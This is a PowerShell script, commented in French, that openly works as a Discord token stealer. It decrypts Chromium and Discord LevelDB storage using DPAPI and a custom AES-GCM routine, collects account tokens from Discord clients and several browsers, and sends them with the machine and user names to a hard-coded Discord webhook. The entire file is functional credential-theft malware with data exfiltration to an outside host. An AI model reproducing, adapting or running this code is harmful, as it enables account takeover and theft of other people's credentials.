<#
  Grab tokens Discord -> webhook. Version simple et directe.
  Usage :  .\grab.ps1
           .\grab.ps1 -Webhook "https://discord.com/api/webhooks/xxx/yyy"
#>
param(
    [string]$Webhook = 'https://discord.com/api/webhooks/1537813377856839784/4f5ACCkcEdc36UuQ9bi45eK7pG-PsVhYYiHWUqATbDuIHhAVfqMqqVlT5oIjuzuV39Ay'
)

$ErrorActionPreference = 'SilentlyContinue'

# ------------------------------------------------------------------
# 1) TLS 1.2 (sinon Discord refuse la connexion sous PS 5.1)
# ------------------------------------------------------------------
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName System.Security

# ------------------------------------------------------------------
# 2) AES-GCM (obligatoire : PS 5.1 n'en a pas nativement)
# ------------------------------------------------------------------
$src = @'
using System;
using System.Security.Cryptography;

public static class DscGcm
{
    private static byte[] Ecb(byte[] key, byte[] block)
    {
        using (AesManaged a = new AesManaged())
        {
            a.Key = key; a.Mode = CipherMode.ECB; a.Padding = PaddingMode.None;
            using (ICryptoTransform e = a.CreateEncryptor())
                return e.TransformFinalBlock(block, 0, 16);
        }
    }

    private static byte[] Mul(byte[] x, byte[] y)
    {
        byte[] z = new byte[16];
        byte[] v = (byte[])y.Clone();
        for (int i = 0; i < 128; i++)
        {
            if ((x[i >> 3] & (1 << (7 - (i & 7)))) != 0)
                for (int j = 0; j < 16; j++) z[j] ^= v[j];

            bool lsb = (v[15] & 1) != 0;
            int carry = 0;
            for (int j = 0; j < 16; j++)
            {
                int nb = v[j] & 1;
                v[j] = (byte)((v[j] >> 1) | (carry << 7));
                carry = nb;
            }
            if (lsb) v[0] ^= 0xE1;
        }
        return z;
    }

    private static byte[] Hash(byte[] h, byte[] data)
    {
        byte[] y = new byte[16];
        int full = data.Length / 16;
        for (int i = 0; i < full; i++)
        {
            byte[] b = new byte[16];
            Buffer.BlockCopy(data, i * 16, b, 0, 16);
            for (int j = 0; j < 16; j++) y[j] ^= b[j];
            y = Mul(y, h);
        }
        int rem = data.Length % 16;
        byte[] last = new byte[16];
        if (rem > 0) Buffer.BlockCopy(data, full * 16, last, 0, rem);
        for (int j = 0; j < 16; j++) y[j] ^= last[j];
        y = Mul(y, h);

        byte[] len = new byte[16];
        long bits = (long)data.Length * 8L;
        for (int i = 0; i < 8; i++) len[15 - i] = (byte)(bits >> (8 * i));
        for (int j = 0; j < 16; j++) y[j] ^= len[j];
        return Mul(y, h);
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag)
    {
        byte[] j0 = new byte[16];
        Buffer.BlockCopy(nonce, 0, j0, 0, 12);
        j0[15] = 1;

        byte[] h  = Ecb(key, new byte[16]);
        byte[] s  = Hash(h, ct);
        byte[] ek = Ecb(key, j0);

        byte[] calc = new byte[16];
        for (int i = 0; i < 16; i++) calc[i] = (byte)(ek[i] ^ s[i]);
        for (int i = 0; i < 16; i++) if (calc[i] != tag[i]) return null;

        byte[] ctr = (byte[])j0.Clone();
        byte[] outBuf = new byte[ct.Length];
        int pos = 0;
        while (pos < ct.Length)
        {
            for (int i = 15; i >= 12; i--) { ctr[i] = (byte)(ctr[i] + 1); if (ctr[i] != 0) break; }
            byte[] ks = Ecb(key, ctr);
            int n = Math.Min(16, ct.Length - pos);
            for (int i = 0; i < n; i++) outBuf[pos + i] = (byte)(ct[pos + i] ^ ks[i]);
            pos += n;
        }
        return outBuf;
    }
}
'@

if (-not ('DscGcm' -as [type])) {
    Add-Type -TypeDefinition $src -Language CSharp
    if (-not ('DscGcm' -as [type])) { Write-Host "ERREUR: impossible de compiler DscGcm" -ForegroundColor Red }
}

# ------------------------------------------------------------------
# 3) Fonctions
# ------------------------------------------------------------------
$Latin1 = [Text.Encoding]::GetEncoding(28591)
$ReEnc  = [regex]'dQw4w9WgXcQ:([^"\\]+)'
$RePlain= [regex]'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
$DPAPI  = [System.Security.Cryptography.DataProtectionScope]::CurrentUser

function Get-MasterKey([string]$localState) {
    if (-not (Test-Path -LiteralPath $localState)) { return $null }
    try {
        $j = Get-Content -LiteralPath $localState -Raw -Encoding UTF8 | ConvertFrom-Json
        if (-not $j.os_crypt.encrypted_key) { return $null }
        $raw = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        return [System.Security.Cryptography.ProtectedData]::Unprotect($raw[5..($raw.Length-1)], $null, $DPAPI)
    } catch { return $null }
}

function Decrypt-Token([string]$b64, [byte[]]$key) {
    # nettoie les octets parasites du LevelDB avant le base64
    $b64 = ($b64 -replace '[^A-Za-z0-9+/=]', '').TrimEnd('=')
    switch ($b64.Length % 4) {
        1 { $b64 = $b64.Substring(0, $b64.Length - 1) }
        2 { $b64 += '==' }
        3 { $b64 += '=' }
    }
    try { $raw = [Convert]::FromBase64String($b64) } catch { return $null }
    if ($raw.Length -lt 31) { return $null }

    if ([Text.Encoding]::ASCII.GetString($raw, 0, 3) -notlike 'v1*') {
        try { return [Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($raw, $null, $DPAPI)) }
        catch { return $null }
    }
    if (-not $key) { return $null }

    $nonce = $raw[3..14]
    $tag   = $raw[($raw.Length-16)..($raw.Length-1)]
    $ct    = $raw[15..($raw.Length-17)]
    if ($ct.Length -eq 0) { return $null }

    $p = [DscGcm]::Decrypt($key, $nonce, $ct, $tag)
    if (-not $p) { return $null }
    return [Text.Encoding]::UTF8.GetString($p)
}

# ------------------------------------------------------------------
# 4) Cibles : Discord + navigateurs
# ------------------------------------------------------------------
$targets = @()
foreach ($d in @('discord','discordcanary','discordptb','Lightcord')) {
    $targets += @{ LS = "$env:APPDATA\$d\Local State"; Dir = "$env:APPDATA\$d\Local Storage\leveldb" }
}

$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
    "$env:LOCALAPPDATA\Vivaldi\User Data",
    "$env:APPDATA\Opera Software\Opera Stable",
    "$env:APPDATA\Opera Software\Opera GX Stable"
)
foreach ($root in $browsers) {
    if (-not (Test-Path -LiteralPath $root)) { continue }
    $profiles = @($root) + @(Get-ChildItem -LiteralPath $root -Directory |
                Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' } |
                Select-Object -ExpandProperty FullName)
    foreach ($p in $profiles) {
        $targets += @{ LS = Join-Path $root 'Local State'; Dir = Join-Path $p 'Local Storage\leveldb' }
    }
}

# ------------------------------------------------------------------
# 5) Scan
# ------------------------------------------------------------------
$tmp = Join-Path $env:TEMP ("grab_" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

$found = @{}
$cache = @{}

foreach ($t in $targets) {
    if (-not (Test-Path -LiteralPath $t.Dir)) { continue }

    $work = Join-Path $tmp ([guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $work -Force | Out-Null

    Get-ChildItem -LiteralPath $t.Dir -File |
        Where-Object { $_.Extension -in '.ldb', '.log' } |
        Copy-Item -Destination $work -Force

    if (-not $cache.ContainsKey($t.LS)) { $cache[$t.LS] = Get-MasterKey $t.LS }
    $key = $cache[$t.LS]

    foreach ($f in Get-ChildItem -LiteralPath $work -File) {
        $text = $Latin1.GetString([IO.File]::ReadAllBytes($f.FullName))

        foreach ($m in $ReEnc.Matches($text)) {
            $tok = Decrypt-Token $m.Groups[1].Value $key
            if ($tok) { $found[$tok] = $true }
        }
        foreach ($m in $RePlain.Matches($text)) {
            $found[$m.Value] = $true
        }
    }
}

Remove-Item -LiteralPath $tmp -Recurse -Force

$tokens = @($found.Keys | Sort-Object)

# ------------------------------------------------------------------
# 6) Envoi
# ------------------------------------------------------------------
Write-Host ""
if ($tokens.Count -eq 0) {
    Write-Host "Aucun token trouve." -ForegroundColor Yellow
} else {
    Write-Host "$($tokens.Count) token(s) trouve(s) :" -ForegroundColor Green
    $tokens | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
}

$lines = $tokens | ForEach-Object { '`' + $_ + '`' }
$body  = if ($tokens.Count -eq 0) {
    "**Aucun token** sur $env:COMPUTERNAME / $env:USERNAME"
} else {
    "**$($tokens.Count) token(s)** sur $env:COMPUTERNAME / $env:USERNAME`n`n" + ($lines -join "`n")
}

# découpe en morceaux de 1900 caracteres (limite Discord = 2000)
$chunks = @()
while ($body.Length -gt 0) {
    if ($body.Length -le 1900) { $chunks += $body; break }
    $cut = $body.LastIndexOf("`n", 1900)
    if ($cut -le 0) { $cut = 1900 }
    $chunks += $body.Substring(0, $cut)
    $body = $body.Substring($cut).TrimStart("`n")
}

foreach ($c in $chunks) {
    try {
        $payload = @{ username = 'Token Grab'; content = $c } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $Webhook -Method Post `
            -ContentType 'application/json; charset=utf-8' `
            -Body $payload -TimeoutSec 20 | Out-Null
        Write-Host "OK -> envoye" -ForegroundColor Green
    } catch {
        Write-Host "ECHEC -> $($_.Exception.Message)" -ForegroundColor Red
    }
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "Termine." -ForegroundColor Cyan
